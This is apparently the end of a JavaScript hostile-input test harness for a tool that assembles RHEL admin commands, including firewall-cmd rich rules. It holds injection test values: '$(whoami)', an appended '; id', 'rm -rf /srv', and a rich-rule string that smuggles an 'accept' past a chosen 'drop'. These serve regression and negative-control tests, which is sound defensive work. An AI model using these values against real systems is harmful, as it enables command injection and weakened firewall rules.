  /* ---- negative control: the CHECKER itself must be able to fail ---------
     A tokeniser that called everything safe would also pass, so hand it two
     commands it must reject. */
  var broken = tokenize("probe --value=" + "$(whoami)");
  if (broken === null || UNQUOTED_OK.test(bareText(broken))) {
    inv.push("negative control: the tokeniser accepted an unquoted $(whoami) as safe");
  }
  /* negative control for the RICH-RULE oracle: it must be able to fail. The
     first string is the command Marcus's MCR-SEC-001 reproduction produced —
     shell-quoting-clean, grammar-injected. The second swaps only the action. */
  var injectedRule = "firewall-cmd --add-rich-rule='rule family=\"ipv4\" source address=\"10.0.0.0/8\" " +
                     "service name=\"ssh\" log prefix=\"X\" level=\"emerg\" limit value=\"1/s\" accept " +
                     "#\" drop' --permanent";
  if (richRuleOracle(injectedRule, { family: "f", source: "s", service: "v", action: "a" },
                     { f: "ipv4", s: "10.0.0.0/8", v: "ssh", a: "drop" }) === null) {
    inv.push("negative control: the rich-rule oracle rated the MCR-SEC-001 injected rule as the " +
             "operator's intent — the oracle cannot fail and therefore proves nothing");
  }
  var swappedAction = "firewall-cmd --add-rich-rule='rule family=\"ipv4\" source address=\"10.0.0.0/8\" " +
                      "accept' --permanent";
  if (richRuleOracle(swappedAction, { family: "f", source: "s", action: "a" },
                     { f: "ipv4", s: "10.0.0.0/8", a: "drop" }) === null) {
    inv.push("negative control: the rich-rule oracle did not notice a swapped ACTION");
  }
  var brokenShape = tokenize("probe --value='x' ; id");
  if (brokenShape !== null && skeleton(brokenShape) === skeleton(tokenize("probe --value='x'"))) {
    inv.push("negative control: the shape comparison did not notice an appended ; id");
  }
  /* MCR-SEC-001 reproduction, verbatim from Marcus Reed's security review of
     4184ea8, kept as a named regression. A comment-typed field wired into a
     rich-rule `service` slot injected a whole `accept` clause and a logging
     clause past a `drop` the operator had selected; the harness rated it
     QUOTED-SAFE because shell quoting did hold. It must now be null. */
  var mcr001 = {
    id: "mcr-sec-001", tool: "firewall-cmd", blast: "green",
    fields: [{ name: "family", type: "family", required: true },
             { name: "src", type: "cidr", required: true },
             { name: "note", type: "comment", required: true },
             { name: "act", type: "action", required: true }],
    template: [{ lit: "firewall-cmd" },
               { flag: "--add-rich-rule",
                 richRule: { family: "family", source: "src", service: "note", action: "act" } },
               { lit: "--permanent" }]
  };
  var mcr001Values = { family: "ipv4", src: "10.0.0.0/8", act: "drop",
                       note: 'ssh" log prefix="X" level="emerg" limit value="1/s" accept #' };
  if (A.validateField("comment", mcr001Values.note).ok !== true) {
    inv.push("MCR-SEC-001 regression: the vector no longer validates as a comment, so this " +
             "regression test has stopped testing the reported defect");
  }
  for (var mv = 0; mv < VERSIONS.length; mv++) {
    var mres = A.assembleCommand(mcr001, VERSIONS[mv], mcr001Values, { patterns: [] });
    if (mres !== null) {
      inv.push("MCR-SEC-001 regression on RHEL " + VERSIONS[mv] + ": a comment-typed field " +
               "composed into a rich-rule slot — " + JSON.stringify(mres.command));
    }
  }
  /* the same shape with the same hostile text but a closed-grammar type must be
     refused by the type's own allow-list, not silently composed */
  var mcr001b = JSON.parse(JSON.stringify(mcr001));
  mcr001b.fields[2].type = "service";
  if (A.assembleCommand(mcr001b, "9", mcr001Values, { patterns: [] }) !== null) {
    inv.push("MCR-SEC-001 regression: a service-typed slot accepted rich-rule syntax as a value");
  }
  if (A.shQuote("it's") !== "'it'\\''s'") inv.push("shQuote() does not use the POSIX '\\'' idiom");
  if (A.shQuote("plain") !== "'plain'") inv.push("shQuote() has a bare-value bypass — quoting must be uniform");

  /* a required field left empty must yield null on every version */
  for (var iv = 0; iv < VERSIONS.length; iv++) {
    var emptySpec = flagSpec("zone", fx.field_types.zone);
    if (A.assembleCommand(emptySpec, VERSIONS[iv], {}, { patterns: [] }) !== null) {
      inv.push("a missing required field produced a command on RHEL " + VERSIONS[iv]);
    }
  }
  /* a field gated out of a version can never appear in that version's command */
  var gated = flagSpec("zone", fx.field_types.zone, ["9", "10"]);
  gated.fields[0].required = false;
  for (var gv = 0; gv < VERSIONS.length; gv++) {
    var g = A.assembleCommand(gated, VERSIONS[gv], { v: "public" }, { patterns: [] });
    var present = g !== null && g.command.indexOf("public") >= 0;
    var allowed = VERSIONS[gv] === "9" || VERSIONS[gv] === "10";
    if (present !== allowed) {
      inv.push("version gating wrong on RHEL " + VERSIONS[gv] + ": value " +
               (present ? "reached" : "did not reach") + " the command");
    }
  }
  /* an enum option gated out of a version cannot be selected on that version */
  var optSpec = flagSpec("enum", { benign: "alpha", options: [{ value: "alpha", versions: VERSIONS },
                                                              { value: "bravo", versions: ["10"] }] });
  for (var ov = 0; ov < VERSIONS.length; ov++) {
    var o = A.assembleCommand(optSpec, VERSIONS[ov], { v: "bravo" }, { patterns: [] });
    if ((o !== null) !== (VERSIONS[ov] === "10")) {
      inv.push("a version-gated enum option was selectable on RHEL " + VERSIONS[ov]);
    }
  }
  /* blast: the destructive table is matched post-assembly, and blast:red stands alone */
  var dz = flagSpec("comment", fx.field_types.comment);
  var red = A.assembleCommand(dz, "9", { v: "rm -rf /srv" },
                              { patterns: [{ id: "dp", match: "rm -rf", label: "l", why: "w", blast_floor: "red" }] });
  if (!red || red.blast !== "red") inv.push("a destructive pattern in the assembled command did not raise blast to red");
  var ownRed = A.assembleCommand({ id: "x", blast: "red", fields: [], template: [{ lit: "true" }] }, "9", {}, { patterns: [] });
  if (!ownRed || ownRed.blast !== "red") inv.push("a content entry's own blast:red did not survive assembly");

  for (var q = 0; q < inv.length; q++) stats.failures.push("invariant: " + inv[q]);

  var report = {
    target: path.relative(REPO, target),
    assembler_bytes: loaded.bytes,
    field_types: types.length,
    vectors: vectors.length,
    versions: VERSIONS.length,
    checks: stats.checks,
    rejected: stats.rejected,
    quoted_safe: stats.quoted,
    rich_rule_oracles: stats.oracles,
    half_formed_checks: halfFormed,
    clipboard_checks: clipboardChecks,
    token_allow_list_checks: tokenChecks,
    destructive_pattern_checks: patternChecks,
    content_spec_checks: contentSpecChecks,
    content_spec_entries: specEntries.length,
    golden_command_checks: goldenChecks,
    option_syntax_checks: syntaxChecks,
    flag_join_checks: joinChecks,
    discriminator_checks: discChecks,
    field_grammar_checks: grammarChecks,
    inspector_flag_checks: inspectorChecks,
    rich_rule_slot_types_refused: richCounts.refusedType,
    rich_rule_slot_types_allowed: richCounts.allowedType,
    positive_controls: controls,
    /* shQuote idiom and uniformity (2) + the MCR-SEC-010 no-YAML-quoter guard
       (1) + empty-required, version gating and gated enums (3 per release)
       + 2 tokeniser negative controls + 2 rich-rule-oracle negative controls
       + 2 blast invariants + the MCR-SEC-001 regression (1 vector check + 1 per
       release + 1 typed) */
    invariants: 2 + 1 + VERSIONS.length * 3 + 2 + 2 + 2 + (2 + VERSIONS.length) + 3,
    failures: stats.failures
  };
  if (asJson) {
    process.stdout.write(JSON.stringify(report, null, 1) + "\n");
  } else {
    console.log("hostile-input harness — " + report.target + " (" + loaded.bytes + " bytes of assembler)");
    console.log("  " + types.length + " field types x " + vectors.length + " vectors x " +
                VERSIONS.length + " releases x 3 argument shapes, plus two rich-rule shapes with " +
                "every field type substituted into every slot");
    console.log("  " + stats.checks + " checks: " + stats.rejected + " rejected (null), " +
                stats.quoted + " quoted-safe, " + stats.failures.length + " FAILED");
    console.log("  rich-rule: " + report.rich_rule_slot_types_refused + " slot/type pairs refused " +
                "structurally, " + report.rich_rule_slot_types_allowed + " allow-listed and composed, " +
                stats.oracles + " compositions parsed and compared element-for-element to the " +
                "operator's intent");
    console.log("  " + halfFormed + " never-half-formed checks (absent optional field across every " +
                "template shape, all four releases)");
    console.log("  " + clipboardChecks + " clipboard-payload checks: every line '# '-prefixed except " +
                "the command, no control character survives, blast sees the whole payload");
    console.log("  " + tokenChecks + " flag/lit allow-list checks and " + patternChecks +
                " destructive-pattern checks (every row of content/dangerous.json fires on a " +
                "synthetic assembled command)");
    console.log("  " + contentSpecChecks + " content-spec checks: every field of every one of the " +
                specEntries.length + " REAL generator entries in content/commands.json (CR-T-17..25), " +
                "fuzzed with the same hostile vector set in its own template, not a synthetic analog");
    console.log("  " + goldenChecks + " golden-command checks (VALIDITY oracle: the exact command " +
                "every generator must emit, per release, hand-authored from the man pages in " +
                "tests/fixtures/golden-commands.json) and " + syntaxChecks + " getopt(3) option-syntax " +
                "checks (no short option joined with '='; every long option keeps its '=')");
    console.log("  " + joinChecks + " derived-join checks: the join is computed from the flag's " +
                "shape, and a token declaring a join its shape derives is null on every release");
    console.log("  " + discChecks + " derived-discriminator checks (an option-shaped lit is an " +
                "OPTION and never an argument slot; a token carrying both lit and flag is refused) " +
                "and " + inspectorChecks + " inspector flag-list checks (MCR-SEC-023: the panel " +
                "names every option the command shows, and no option it does not)");
    console.log("  " + grammarChecks + " closed-grammar checks (MCR-SEC-016: lvm_size and " +
                "group_list, with the '+10G' grow form accepted and a free-text LVM size refused " +
                "on the real generator)");
    console.log("  " + controls + " positive controls (benign value per type/release/shape) and " +
                report.invariants + " invariants");
    var classes = Object.keys(stats.byClass).sort();
    for (var c = 0; c < classes.length; c++) {
      console.log("    " + classes[c] + ": " + stats.byClass[classes[c]].rejected + " rejected, " +
                  stats.byClass[classes[c]].quoted + " quoted-safe");
    }
    for (var ff = 0; ff < stats.failures.length; ff++) console.log("  FAIL: " + stats.failures[ff]);
  }
  process.exit(stats.failures.length ? 1 : 0);
}

/* Run as a CLI (`node tests/hostile_harness.js`) exactly as before. Required as
   a module, export the pieces tests/shift_crosscheck_driver.js needs, so the
   exhaustive shift cross-check (MCR-SEC-018, condition E3) lifts the SAME
   assembler through the SAME purity-checked extractor rather than growing a
   second copy of it. */
if (require.main === module) {
  main();
} else {
  module.exports = { extractAssembler: extractAssembler, tokenize: tokenize,
                     skeleton: skeleton, optionSyntaxErrors: optionSyntaxErrors };
}
